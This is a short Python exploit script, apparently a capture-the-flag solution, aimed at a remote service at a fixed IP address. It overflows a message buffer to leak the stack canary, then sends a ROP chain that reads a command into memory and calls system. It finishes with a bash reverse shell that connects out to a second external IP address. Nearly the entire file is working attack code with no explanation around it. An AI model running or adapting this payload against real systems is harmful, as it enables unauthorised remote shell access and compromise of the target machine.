from pwnlib import *

SERVER = (("110.10.212.130", 8889))
#(("localhost", 8181))
s = Socket(SERVER)

payload = "A"*40 + "B"


s.ru("ct menu > ")
s.send("1\n")

s.ru("Message : ")
s.send(payload)
s.ru(payload)
canary = "\x00" + s.recv(3)

print "canary: " + canary.encode("hex")


raw_input("> ")
s = Socket(SERVER)

pop2 = 0x8048b84
system = 0x8048620
buf = 0x804b1bc

payload = "A"*40
payload += canary
payload += "B"*12
payload += pd(0x8048907) # do recv
payload += pd(pop2)
payload += pd(buf)
payload += pd(0x40)
payload += pd(system)
payload += "C"*4
payload += pd(buf)
s.ru("ct menu > ")
s.send("1\n")

s.ru("Message : ")
s.send(payload)

s.ru("ct menu > ")
s.send("3\n")

raw_input("> ")
s.send("bash -c '(bash -i >& /dev/tcp/52.24.152.211/1475 0>&1)'\x00")

s.interact()
